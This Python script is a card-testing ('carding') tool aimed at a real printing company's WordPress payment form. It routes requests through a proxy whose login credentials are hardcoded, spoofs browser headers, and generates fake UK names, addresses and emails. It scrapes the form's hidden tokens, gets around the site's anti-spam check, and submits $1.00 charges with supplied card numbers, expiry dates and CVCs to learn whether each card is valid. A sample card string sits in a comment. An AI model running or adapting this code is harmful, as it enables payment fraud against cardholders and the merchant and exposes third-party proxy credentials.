import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_5c664e64-zone-datacenter_proxy1:0bnfn02i83lj"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    elif "01" in mm or "02" in mm or "01" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
        mm = mm.split("0")[1]

    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)
    d1 = random.randint(1, 4)
    d2 = random.randint(1, 99)
    
    headers = {
        'authority': 'gaschprinting.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        #'if-modified-since': 'Mon, 27 Apr 2026 17:50:34 GMT',
        'referer': 'https://www.google.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = session.get('https://gaschprinting.com/payment/', headers=headers)
    
    ajax = re.search(r"&amp;hash=(.*?)'", response.text).group(1)
    currency = re.search(r"data-currency='USD' value='(.*?)'", response.text).group(1)
    state = re.search(r"name='state_17' value='(.*?)'", response.text).group(1)
    version = re.search(r'"version_hash":"(.*?)"', response.text).group(1)
    #print(version)
    
    headers = {
        'authority': 'gaschprinting.com',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarysZBh1P8FPB664qH2',
        # 'cookie': '_ga_N1RGE1QFPY=GS2.1.s1777346171$o1$g0$t1777346171$j60$l0$h0; _ga_ZHE15SD08C=GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0; _gid=GA1.2.353576958.1777346172; _ga_RWYLJZJJB6=GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0; _ga=GA1.1.714877889.1777346172; __hstc=256288468.4c1899bee07bf938a0ed6db2bce1829c.1777346173495.1777346173495.1777346173495.1; hubspotutk=4c1899bee07bf938a0ed6db2bce1829c; __hssrc=1; __hssc=256288468.1.1777346173496; cookie_notice_accepted=false',
        'origin': 'https://gaschprinting.com',
        'referer': 'https://gaschprinting.com/payment/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
    }
    
    files = {
        'action': (None, 'gf_zero_spam_token'),
        'form_id': (None, '17'),
    }
    
    response = session.post('https://gaschprinting.com/wp-admin/admin-ajax.php', #cookies=cookies, 
    headers=headers, files=files)
    
    zero = response.json()['token']
    #print(zero)
    
    cookies = {
        '_ga_N1RGE1QFPY': 'GS2.1.s1777346171$o1$g0$t1777346171$j60$l0$h0',
        '_ga_ZHE15SD08C': 'GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0',
        '_gid': 'GA1.2.353576958.1777346172',
        '_ga_RWYLJZJJB6': 'GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0',
        '_ga': 'GA1.1.714877889.1777346172',
        '__hstc': '256288468.4c1899bee07bf938a0ed6db2bce1829c.1777346173495.1777346173495.1777346173495.1',
        'hubspotutk': '4c1899bee07bf938a0ed6db2bce1829c',
        '__hssrc': '1',
        '__hssc': '256288468.1.1777346173496',
        'cookie_notice_accepted': 'false',
    }
    
    headers = {
        'authority': 'gaschprinting.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryJcha4meBsJYFnYRC',
        # 'cookie': '_ga_N1RGE1QFPY=GS2.1.s1777346171$o1$g0$t1777346171$j60$l0$h0; _ga_ZHE15SD08C=GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0; _gid=GA1.2.353576958.1777346172; _ga_RWYLJZJJB6=GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0; _ga=GA1.1.714877889.1777346172; __hstc=256288468.4c1899bee07bf938a0ed6db2bce1829c.1777346173495.1777346173495.1777346173495.1; hubspotutk=4c1899bee07bf938a0ed6db2bce1829c; __hssrc=1; __hssc=256288468.1.1777346173496; cookie_notice_accepted=false',
        'origin': 'https://gaschprinting.com',
        'referer': 'https://gaschprinting.com/payment/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'iframe',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    files = [
        ('input_1.3', (None, f'{first_name}')),
        ('input_1.6', (None, f'{last_name}')),
        ('input_5', (None, '')),
        ('input_9', (None, f'430300{lr}')),
        ('input_8', (None, '1')),
        ('input_2', (None, '$1.00')),
        ('input_3', (None, f'yellhtetgaung{nr}@gmail.com')),
        ('input_4', (None, '')),
        ('input_7', (None, '$1.00')),
        ('input_6.1', (None, f'{n}')),
        ('input_6.2[]', (None, f'{mm}')),
        ('input_6.2[]', (None, f'20{yy}')),
        ('input_6.3', (None, f'{cvc}')),
        ('input_6.5', (None, f'{first_name} {last_name}')),
        ('gform_ajax', (None, f'form_id=17&title=&description=&tabindex=0&theme=gravity-theme&styles=[]&hash={ajax}')),
        ('gform_submission_method', (None, 'iframe')),
        ('gform_theme', (None, 'gravity-theme')),
        ('gform_style_settings', (None, '[]')),
        ('is_submit_17', (None, '1')),
        ('gform_submit', (None, '17')),
        ('gform_currency', (None, f'{currency}')),
        ('gform_unique_id', (None, '')),
        ('state_17', (None, f'{state}')),
        ('gform_target_page_number_17', (None, '0')),
        ('gform_source_page_number_17', (None, '1')),
        ('gform_field_values', (None, '')),
        ('version_hash', (None, f'{version}')),
        ('gform_submission_speeds', (None, '{"pages":{"1":[87493]}}')),
        ('gf_zero_spam_token', (None, f'{zero}')),
    ]
    
    response = session.post('https://gaschprinting.com/payment/', #cookies=cookies, 
    headers=headers, files=files)
    
    try:
        result = re.search(r"class='gfield_description validation_message gfield_validation_message'><!-- (.*?)<\/div><\/fieldset>", response.text).group(1)
    except:
        result = re.search(r"class='gform_confirmation_message_17 gform_confirmation_message'>(.*?)<\/div><\/div>", response.text).group(1)

    return result
    
#test_card = "5132848403801477|04|2026|399"
#print(Tele(test_card))
